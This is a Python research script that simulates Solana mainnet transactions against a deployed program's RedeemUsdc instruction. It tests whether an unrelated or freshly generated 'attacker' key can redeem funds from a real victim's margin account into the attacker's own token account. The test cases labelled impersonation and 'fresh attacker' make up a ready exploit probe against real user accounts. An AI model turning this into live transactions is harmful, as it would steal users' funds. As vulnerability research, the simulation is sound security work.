#!/usr/bin/env python3
"""FINAL simulation matrix for RedeemUsdc: ownership gates + amount unit.
AccountMeta(pubkey, is_signer, is_writable) - fixed.
"""
import json, urllib.request, time, base64
from solders.transaction import Transaction
from solders.message import Message
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.hash import Hash

RPC = "https://api.mainnet-beta.solana.com"
def rpc(method, params, retries=5, timeout=120):
    body = json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode()
    last=None
    for i in range(retries):
        try:
            req = urllib.request.Request(RPC, data=body, headers={"Content-Type":"application/json","User-Agent":"research/1.0"})
            with urllib.request.urlopen(req, timeout=timeout) as r:
                out = json.loads(r.read())
            if "error" in out: raise RuntimeError(out["error"])
            return out
        except Exception as e:
            last=e; time.sleep(1.2*(i+1))
    raise RuntimeError(str(last))

ZO = Pubkey.from_string("Zo1ggzTUKMY5bYnDvT5mtVeZxzf2FaLTbKkmvGUhUQk")
TOKEN = Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
STATE = Pubkey.from_string("71yykwxq1zQqy99PgRsgZJXi2HHK2UDx9G4va7pH6qRv")
VAULT = Pubkey.from_string("HjHSNe8hhvZ8hKCRrhKg1DGiGPd9NYQbUjT1SQRDo4kZ")
A2 = Pubkey.from_string("6kSuaA8Fi16ks53ye8eqgr7jZn2uus59W7gMSasgtFon")
A8 = Pubkey.from_string("Dwi4TnaYJTMUkVaHQgfKq6QzuWsyFSJwMxzkTemTLrvt")
VAULT_ATA = Pubkey.from_string("3er2PEWxhpuRkbVwE3ks2nynr5EtcSjCs5fdDJiKQocp")
REDEEM_DATA = bytes.fromhex("658ef6b8c6385cae")

def redeem_ix(signer, margin, control, dest):
    M = lambda pk, s, w: AccountMeta(pk, s, w)
    return Instruction(ZO, REDEEM_DATA, [
        M(STATE, False, True),
        M(VAULT, False, False),
        M(A2, False, True),
        M(signer, True, True),
        M(margin, False, True),
        M(control, False, True),
        M(dest, False, True),
        M(VAULT_ATA, False, True),
        M(A8, False, False),
        M(TOKEN, False, False),
    ])

def sim(ixs, payer, label, extra=None):
    msg = Message.new_with_blockhash(ixs, payer, Hash.default())
    tx = Transaction.new_unsigned(msg)
    b64 = base64.b64encode(bytes(tx)).decode()
    r = rpc("simulateTransaction",[b64,{"encoding":"base64","sigVerify":False,"replaceRecentBlockhash":True,"commitment":"processed"}])
    v=r["result"]["value"]
    logs=v.get("logs") or []
    amt=None; events=[]
    for l in logs:
        if "Program data:" in l:
            raw=base64.b64decode(l.split("Program data: ")[1].strip())
            events.append(raw.hex())
            if raw.hex().startswith("437a2f4a0f060e20") and len(raw)==80:
                amt=int.from_bytes(raw[-8:],"little")
    # token balance deltas
    deltas=[]
    pre={}; post={}
    for b in v.get("preTokenBalances") or []:
        pre[b["accountIndex"]]=(b["owner"], b["uiTokenAmount"]["amount"])
    for b in v.get("postTokenBalances") or []:
        post[b["accountIndex"]]=(b["owner"], b["uiTokenAmount"]["amount"])
    keys=[str(k) for k in msg.account_keys]
    for idx in set(list(pre)+list(post)):
        if idx<len(keys):
            a=int(pre.get(idx,("",0))[1]); b=int(post.get(idx,("",0))[1])
            if a!=b: deltas.append((keys[idx], a, b, b-a))
    print(f"\n### {label}\n  err: {json.dumps(v.get('err'))}\n  RedeemUsdcLog amount(raw): {amt}\n  token deltas: {deltas}")
    for l in logs:
        if "AnchorError" in l or "Instruction:" in l or "failed" in l.lower() or "Result" in l:
            print("   log:", l[:190])
    return {"label":label,"err":v.get("err"),"amount":amt,"deltas":deltas,"logs":logs,"events":events}

results=[]
# --- funded margin with existing ATA ---
M_FUND = Pubkey.from_string("DThQMJiTJbyxcseJ6mCT9RDpHTfWFAFVJcqoqd4xCbGv")
A_FUND_ATA = Pubkey.from_string("2CwcHD2rawi5WKzxbdr7qUtvfbeu8rubWXwEFNj6gvoU")
mv=rpc("getAccountInfo",[str(M_FUND),{"encoding":"base64"}])["result"]["value"]
raw=base64.b64decode(mv["data"][0])
A_FUND = Pubkey.from_bytes(raw[9:41]); CTRL_FUND = Pubkey.from_bytes(raw[441:473])
print("funded margin authority:", A_FUND, "control:", CTRL_FUND)

results.append(sim([redeem_ix(A_FUND, M_FUND, CTRL_FUND, A_FUND_ATA)], A_FUND,
   "T-OWN: funded margin owner redeems own margin (amount unit test)"))

# --- 531euoNt reference accounts ---
S531 = Pubkey.from_string("531euoNtZMvciBcKPBvYgFJoWnUvtu4PjasDhbTTXTGG")
S531_ATA = Pubkey.from_string("3RKQCBVZ55CKZJTVG7qyo25EhyEQUGQL4LGQXKFuXb1g")
S531_MARGIN = Pubkey.from_string("5UjdurrpbP3i2hkw3Q2twfcz1X7VPpQWtruNwuxRvGX8")
S531_CTRL = Pubkey.from_string("4np53fZWjiHrJqddLssaA2mzA13ryc5GFZFmn1UBsQNV")
results.append(sim([redeem_ix(S531, S531_MARGIN, S531_CTRL, S531_ATA)], S531,
   "T-CONTROL: 531euoNt own margin/control/dest (expect amount=0)"))

# --- impersonation ---
results.append(sim([redeem_ix(S531, M_FUND, CTRL_FUND, S531_ATA)], S531,
   "T-IMP-A: 531euoNt signer + VICTIM margin/control -> 531euoNt ATA"))
results.append(sim([redeem_ix(S531, M_FUND, S531_CTRL, S531_ATA)], S531,
   "T-IMP-B: 531euoNt signer + VICTIM margin + own control -> own ATA"))
results.append(sim([redeem_ix(S531, M_FUND, CTRL_FUND, A_FUND_ATA)], S531,
   "T-IMP-C: 531euoNt signer + VICTIM margin/control -> VICTIM ATA"))

# --- fresh attacker ---
ATT = Pubkey.new_unique()
results.append(sim([redeem_ix(ATT, M_FUND, CTRL_FUND, A_FUND_ATA)], ATT,
   "T-FRESH: fresh key + VICTIM margin/control -> VICTIM ATA"))
results.append(sim([redeem_ix(ATT, S531_MARGIN, S531_CTRL, S531_ATA)], ATT,
   "T-FRESH-2: fresh key + 531euoNt margin/control -> 531euoNt ATA"))

json.dump(results, open("analysis/sim_redeem_final.json","w"), indent=1, default=str)
print("\nDONE")
